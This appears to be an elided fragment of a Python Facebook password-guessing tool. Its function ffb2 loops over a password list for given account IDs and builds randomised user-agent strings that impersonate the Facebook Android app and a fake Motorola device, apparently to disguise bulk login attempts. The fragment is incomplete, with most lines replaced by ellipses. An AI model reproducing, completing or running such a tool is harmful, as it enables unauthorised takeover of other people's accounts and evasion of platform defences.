...
print('\x1b[1;32m[!] installing modules...\n')
...
def ffb2(ids,names,passlist):
		try:
			...
			for pw in passlist:
				...
				ffb=random.choice(fbks)
				dvlk = random.choice(usr)
				ua_string = f'{str(dvlk)} [FBAN/FB4A;FBAV/'+fbav+';FBPN/com.facebook.katana;FBLC/es_MX;FBBV/'+fbbv+';FBCR/Smartfren Indonesia;FBMF/motorola;FBBD/motorola;FBDV/moto e5 plus;FBSV/'+fbsv+';FBCA/armeabi-v7a:armeabi;FBDM/{density=1.7,width=720,height=1358};FB_FW/1;FBRV/'+fbrv+';]'
				li = ['28','29','210']
				li2 = random.choice(li)
				j1 = ''.join(random.choice(digits) for _ in range(2))
				j2 = li2+j1
